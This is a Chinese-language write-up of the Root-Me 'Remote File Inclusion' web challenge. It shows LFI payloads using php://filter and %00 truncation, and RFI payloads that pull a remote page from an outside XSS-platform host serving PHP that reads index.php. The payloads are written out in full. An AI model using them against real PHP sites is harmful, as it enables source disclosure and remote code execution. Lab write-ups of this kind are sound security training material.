## [[Root-Me](https://www.root-me.org/)] [[Web-Server](https://www.root-me.org/en/Challenges/Web-Server/)] [[Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)] [[解题报告](http://exp-blog.com/2019/03/09/pid-3517/)]

------


## 题目分析

PHP 的 RFI （远程文件包含）漏洞利用，与 LFI （本地文件包含）很类似。

题目要求我们获取 PHP 页面源码，开启挑战后，只有 [Français](http://challenge01.root-me.org/web-serveur/ch13/?lang=fr) （`?lang=fr`） 和  [English](http://challenge01.root-me.org/web-serveur/ch13/?lang=en) （`?lang=en`） 两个选项。

顺手测试了一下，当前页面的名称为 `index.php` ：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B29%5D%20%5B30P%5D%20Remote%20File%20Inclusion/imgs/01.png)

换言之我们有 3 个页面：`?lang=fr`、`?lang=en`、 `index.php` 。

------------

## LFI 试错

虽然题目提示要使用 RFI 完成挑战，但是还是先测试下 LFI 的效果。

可以利用 `php://filter` 特性读取页面源码，构造这样的 payload ：

`?lang=php://filter/convert.base64-encode/resource=fr`

于是得到 Base64 编码的页面源码：

```base64
PD9waHAKCiRsYW5nID0gYXJyYXkgKAogICAgICAgICAgICAnbGFuZycgPT4gJ0xhbmd1ZScsCiAgICAgICAgICAgICd3ZWxjb21lJyA9PiAnQmllbnZlbnVlIHN1ciBub3RyZSBub3V2ZWF1IHNpdGUgd2ViICEnLAogICAgICAgICk7Cgo/Pgo=
```

对其解码虽然得到源码，但是没有有效的信息：

```php
<?php

$lang = array (
            'lang' => 'Langue',
            'welcome' => 'Bienvenue sur notre nouveau site web !',
        );

?>
```

类似地，`?lang=en` 的页面源码也是没提供有效的信息。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B29%5D%20%5B30P%5D%20Remote%20File%20Inclusion/imgs/02.png)


换言之，有效信息应该保存在  `index.php` 。于是构造类似的 payload 去读取页面源码：

`?lang=php://filter/convert.base64-encode/resource=index.php`

但是页面报错：

```
Warning: include(php://filter/convert.base64-encode/resource=index.php_lang.php): failed to open stream
```

从报错分析可以知道，代码会把 `?lang=输入` 构造成 `include('输入_lang.php')`

亦即前面之所以可以读取到 `?lang=fr` 和 `?lang=en` 的内容，是因为他们真正的文件名是 `fr_lang.php` 和 `en_lang.php` 。

但是因为不存在 `index_lang.php` 和 `index.php_lang.php` 页面，所以 `include()`  Local File 时就会报错。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B29%5D%20%5B30P%5D%20Remote%20File%20Inclusion/imgs/03.png)


其实在 LFI 的领域，这种情况（include 的文件被强制加了后缀）是有办法处理的。

因为 PHP 是用 C 语言编写的，而在 C 语言中，标记一个字符串的终止符是 `\0` ，其 URL 编码是 `%00` 。

因此可以尝试在 payload 末尾添加 `%00` 以截断被强制添加的 `_lang.php` 后缀：

`?lang=php://filter/convert.base64-encode/resource=index.php%00`

但是这次报错为 `Warning: include()` ，即 `include` 的参数被置空，说明 `%00` 被过滤了。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B29%5D%20%5B30P%5D%20Remote%20File%20Inclusion/imgs/04.png)

------------

## RFI 漏洞

由于 LFI 的最后希望被封堵，我们把策略转移到 RFI 。

其实 RFI 更简单，从前面分析已经知道，代码会把 `?lang=输入` 构造成 `include('输入_lang.php')`。

RFI 只需要再 `输入` 点直接设置 URL 地址即可，如 payload 为：`?lang=https://www.baidu.com` 。

但是页面返回报错 ` Warning: include(https://www.baidu.com_lang.php): failed to open stream` 。

这是因为 `_lang.php` 后缀作祟。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B29%5D%20%5B30P%5D%20Remote%20File%20Inclusion/imgs/05.png)

在 RFI 中要截断后缀，只需要在末尾添加 `?` 即可，这样后缀就会变成 URL 的参数，亦即构造 payload 为：

`?lang=https://www.baidu.com?` 

于是我们成功把百度嵌入到了页面中：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B29%5D%20%5B30P%5D%20Remote%20File%20Inclusion/imgs/06.png)

------------

## RFL 注入

既然可以成功嵌入百度，那么也可以嵌入 payload 页面。

所以接下来要做的，就是在一个公网可访问的 WEB 服务器上构造一个页面，把该页面的内容作为 payload ，读取发起 `include` 行为的页面源码。

为了节省搭建 WEB 服务器的资金，从这里开始我们利用 XSS 平台，推荐 [http://xss.tf](http://xss.tf) 。

在 XSS 平台上新建一个项目，并配置自定义代码 `<?php echo file_get_contents('index.php') ?>` 。

配置完成后，我们得到访问这个项目的页面地址为 `http://xss.tf/M5Q` 

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B29%5D%20%5B30P%5D%20Remote%20File%20Inclusion/imgs/07.png)

将 XSS 项目的 URL 注入挑战页面，即构造 payload ： `?lang=http://xss.tf/M5Q?`

成功读取到 `index.php` 的源码，打开浏览器的开发者工具，在注释中找到 flag ，完成挑战。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B29%5D%20%5B30P%5D%20Remote%20File%20Inclusion/imgs/08.png)

------------

## 其他 payload

在 XSS 平台上构造 payload 的过程中，我发现这题挑战其实不止一个解法:

在 `inlcule()` 参数的引号被闭合后，可以注入 HTML 和 JS 代码，然后在 JS 代码中调用 PHP 代码。

例如构造这样的 payload 一样可以成功读取到页面源码：

`'<img src=0 onerror="<?php echo file_get_contents('index.php') ?>" />'`

 看上去好像多此一举，不过在某些情况可能会很有用。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B29%5D%20%5B30P%5D%20Remote%20File%20Inclusion/imgs/09.png)


------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
